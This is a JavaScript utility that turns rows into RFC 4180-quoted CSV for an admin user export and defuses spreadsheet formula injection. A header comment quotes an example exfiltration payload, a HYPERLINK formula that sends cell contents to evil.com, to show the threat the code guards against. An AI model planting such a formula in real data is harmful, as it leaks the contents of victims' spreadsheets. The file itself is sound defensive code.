// src/utils/csv.js
// PURPOSE: Turn rows of data into a correctly-escaped, safe CSV string.
// INTENDED OUTPUT LINK: backs the admin "Export user list" feature. Doing this
// properly matters for two reasons that a naive values.join(",") gets wrong:
//
//   1) CORRECTNESS — an institution named "Tec de Monterrey, Campus Norte"
//      contains a comma. Joined naively it splits into two columns and every
//      following column shifts, silently corrupting the whole export.
//
//   2) SECURITY (CSV / formula injection) — spreadsheet apps execute any cell
//      starting with = + - or @. A user who sets their name to
//      =HYPERLINK("http://evil.com?d="&A1,"click") turns the admin's own export
//      into an attack the moment they open it in Excel. We neutralize those.

// Characters that make Excel/Sheets treat a cell as a formula rather than text.
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"]; // Leading tab/CR are also treated as formula lead-ins by Excel.

function escapeCell(value) {                       // Convert one value into a safe CSV cell.
  if (value === null || value === undefined) return ""; // NULL/undefined become an empty cell, not the text "null".

  let s = String(value);                            // Coerce numbers, dates, booleans to text.

  // Defuse formula injection by prefixing a single quote, which spreadsheets
  // interpret as "treat the rest as literal text". The visible value is unchanged.
  if (FORMULA_TRIGGERS.includes(s[0])) {            // Only when the FIRST character is a trigger.
    s = "'" + s;                                    // e.g. "=SUM(A1)" becomes "'=SUM(A1)" and is shown, not executed.
  }

  // RFC 4180 quoting: a field containing a comma, double quote, or newline must be
  // wrapped in double quotes, and any inner double quote must be doubled.
  if (/[",\n\r]/.test(s)) {                         // Does the value contain a character that needs quoting?
    s = '"' + s.replace(/"/g, '""') + '"';          // Double the inner quotes, then wrap the whole field.
  }

  return s;                                         // The finished, safe cell.
}

// Build a full CSV document from column definitions and data rows.
export function toCsv(columns, rows) {              // columns = [{ key, label }], rows = array of objects.
  const header = columns                            // Build the header line first...
    .map((c) => escapeCell(c.label))                // ...escaping labels too (they may contain commas).
    .join(",");                                     // Comma-separate the column names.

  const body = rows                                 // Then one line per data row.
    .map((row) =>                                   // For each row...
      columns                                       // ...walk the columns in the SAME order as the header...
        .map((c) => escapeCell(row[c.key]))         // ...pull and escape that row's value for the column.
        .join(",")                                  // Comma-separate the cells.
    )
    .join("\r\n");                                  // CRLF line endings, as the CSV spec requires for Excel compatibility.

  // Leading \uFEFF is a UTF-8 byte-order mark. Without it Excel misreads accented
  // characters, so "Ingeniería" would open as "IngenierÃ­a".
  return "\uFEFF" + header + "\r\n" + body;         // BOM + header + rows.
}
